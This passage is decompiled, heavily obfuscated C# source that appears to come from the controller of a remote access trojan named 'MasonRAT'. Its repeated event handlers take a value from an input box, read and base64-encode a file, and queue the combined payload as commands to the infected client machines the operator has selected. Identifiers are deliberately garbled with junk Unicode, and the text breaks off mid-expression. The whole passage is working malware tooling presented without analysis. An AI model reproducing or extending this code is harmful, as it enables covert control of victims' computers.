        byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1547) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1548))) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), Right), (object) Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1549))));
        try
        {
          foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
          {
            Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u060Aـدۚۧ\u0608دب\u060Aڼ\u0608ۚئـ\u0609(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      object Right = (object) Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1550), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1551), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1552), ((-172558739 ^ 14) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) - -((351165499 > 976227258 ? 230078330 : 172558748) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1), (1598716456 + ~1530400346 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) - ((68316103 ^ 9) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0));
      if (!string.IsNullOrWhiteSpace(Conversions.ToString(Right)))
      {
        byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1553) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1554))) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), Right), (object) Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1555))));
        try
        {
          foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
          {
            Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cٻۙاــﻋـ\u0608̍\u060Dڙ\u060F\u060Aــۛدڞ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      object Right = (object) Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1556), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1557), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1558), (-356278870 - 1579072928 % 1651886697 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) - ~((-2126089680 ^ -232952380) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1), ((-1070071825 ^ 16 /*0x10*/) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + ((1176684546 ^ (923935339 | 1639608307)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 << ((269604536 ^ 1365231901 % 1070156530) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0);
      if (!string.IsNullOrWhiteSpace(Conversions.ToString(Right)))
      {
        byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1559) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1560))) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), Right), (object) Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1561))));
        try
        {
          foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
          {
            Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cڙ\u0609ڙ\u060Fۙـٸ\u0609\u0608ــ\u060F\u060Aڕـ\u060Aگـ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      object Right = (object) Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1562), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1563), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1564), (1612870358 + ~492684310 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + (-627260146 - ~1079519286 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 << 2026342785 - (276773816 | 953257051) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1), (752614336 + -752615951 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + (-1927559395 - 1521149801 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 >> (632978525 > 1263240873 ? -1897817191 : 1797862579) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0));
      if (!string.IsNullOrWhiteSpace(Conversions.ToString(Right)))
      {
        byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1565) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1566))) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), Right), (object) Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1567))));
        try
        {
          foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
          {
            Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u060Dـ\u060Cژــ\u060Bۛﻋۚ\u0609ڣـ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      object Right = (object) Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1568), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1569), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1570), -1998102181 - 533104497 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 + -(-1172982903 - 1358223774 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0), (-191698213 - 1755763759 % 1318517530 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + (1284166909 - 655222468 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 >> 1));
      if (!string.IsNullOrWhiteSpace(Conversions.ToString(Right)))
      {
        byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1571) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1572))) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), Right), (object) Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1573))));
        try
        {
          foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
          {
            Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u0020ۡـ\u060E\u060D\u060E\u060D\u060Dۡــڦﻻ\u0609(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      object Right = (object) Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1574), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1575), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1576), -1873698250 - (401794153 >> 1886122091) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 + ((849435685 ^ 285353425 << 937724788) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0), (386227731 - 1969080934 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + (73145419 - -1509707783 + 